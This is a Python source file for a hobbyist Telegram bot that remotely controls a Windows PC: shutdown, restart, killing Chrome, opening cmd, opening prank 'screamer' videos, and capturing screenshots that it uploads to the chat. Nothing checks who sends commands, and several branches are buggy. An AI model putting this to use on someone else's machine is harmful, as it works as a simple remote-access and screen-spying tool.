import telebot
import random
import webbrowser
from telebot import types
import os
import socket as soc
import pyautogui

#ip and pc hostname
hostname = soc.gethostname()
IP_Address = soc.gethostbyname(hostname)

#bot token
bot = telebot.TeleBot('Token')

#video list list
ranlist = ["any youtube video link"]#this is list and then bot do random chois of this videos

@bot.message_handler(commands=['start'])
def start(message):

    # keyboard
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("🎲 Random")
    item2 = types.KeyboardButton("🌐Browser")
    item3 = types.KeyboardButton("🖥️pc")
    item4 = types.KeyboardButton("🔗video")

    markup.add(item1, item2, item3, item4)

    bot.send_message(message.chat.id, "lets start", parse_mode='html', reply_markup=markup)


@bot.message_handler(content_types=['text'])
def text(message):

    if message.chat.type == 'private':

        if message.text == '🎲 Random':
            bot.send_message(message.chat.id, str(random.randint(-100, 100)))
        elif message.text == '🌐Browser':

            markup = types.InlineKeyboardMarkup(row_width=3)
            item1 = types.InlineKeyboardButton("Youtube", callback_data='Youtube')
            item2 = types.InlineKeyboardButton("Google", callback_data='Google')
            item3 = types.InlineKeyboardButton("Imovies", callback_data='Imovies')
            item4 = types.InlineKeyboardButton("close google", callback_data='close google')

            markup.add(item1, item2, item3, item4)

            bot.send_message(message.chat.id, "🌐Browser", reply_markup=markup)
        elif message.text == "🖥️pc":
            markup = types.InlineKeyboardMarkup(row_width=3)
            item1 = types.InlineKeyboardButton("restart", callback_data='restart')
            item2 = types.InlineKeyboardButton("shut down", callback_data='shut down')
            item3 = types.InlineKeyboardButton("Task ", callback_data='task')
            item4 = types.InlineKeyboardButton("Cmd", callback_data='cmd')
            item5 = types.InlineKeyboardButton("IP", callback_data='IP')
            item6 = types.InlineKeyboardButton("screen", callback_data='screen')

            markup.add(item1, item2, item3, item4, item5, item6)

            bot.send_message(message.chat.id, "🖥️pc", reply_markup=markup)
        elif message.text == "🔗Link":
            markup = types.InlineKeyboardMarkup(row_width=2)
            item1 = types.InlineKeyboardButton("screamer", callback_data='screamer')
            item2 = types.InlineKeyboardButton("shreck", callback_data='shreck')
            item3 = types.InlineKeyboardButton("shreck-love", callback_data='shreck-love')

            markup.add(item1, item2, item3)

            bot.send_message(message.chat.id, "🔗Link", reply_markup=markup)
        elif message.text == message.text:
            search = message.text
            webbrowser.open("https://www.google.com/search?q=" + search)
        else:
            bot.send_message(message.chat.id, "i don't know this command, sorry")

@bot.message_handler(content_types=['file'])
def download(message):
    if message.text == message.file:
        print('hi')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    try:
        if call.message:
            if call.data == 'Youtube':
                bot.send_message(call.message.chat.id, 'Youtube is open')
                webbrowser.open("https://www.youtube.com")
            elif call.data == 'Google':
                bot.send_message(call.message.chat.id, 'Google is open')
                webbrowser.open("https://www.google.com")
            elif call.data == 'Imovies':
                bot.send_message(call.message.chat.id, 'Imovies is open')
                webbrowser.open("https://www.imovies.cc/ka")
            elif call.data == 'restart':
                bot.send_message(call.message.chat.id, 'pc restart')
                os.system("shutdown /r")
            elif call.data == 'shut down':
                bot.send_message(call.message.chat.id, 'pc shut down')
                os.system("shutdown /s")
            elif call.data == 'close google':
                bot.send_message(call.message.chat.id, 'google close')
                os.system("taskkill /f /im chrome.exe")
            elif call.data == 'screamer':
                bot.send_message(call.message.chat.id, 'video open')
                webbrowser.open(random.choice(ranlist))
            elif call.data == 'cmd':
                os.system("start /B start cmd.exe @cmd /k mycommand...")
            elif call.data == 'IP':
                bot.send_message(call.message.chat.id, 'host/pc name:' + hostname)
                bot.send_message(call.message.chat.id, 'IP:' + IP_Address)
            elif call.data == 'screen':
                pyautogui.screenshot().save(r'name.png')
                screen = open('name.png', 'rb')
                bot.send_document(call.message.chat.id, screen)
            elif call.data == 'task':
                os.system("cmd /c Taskmgr")
            elif call.data == 'shreck':
                bot.send_message(call.message.chat.id, 'video open')
                webbrowser.open_new_tab("https://www.youtube.com/watch?v=aXhvKfkTyJE")
            elif call.data == 'shreck-love':
                bot.send_message(call.message.chat.id, 'video open')
                webbrowser.open_new_tab("https://www.youtube.com/watch?v=ndjEvpzAnO0&t=1s")



    except Exception as e:
        print(repr(e))



bot.polling(none_stop=True)
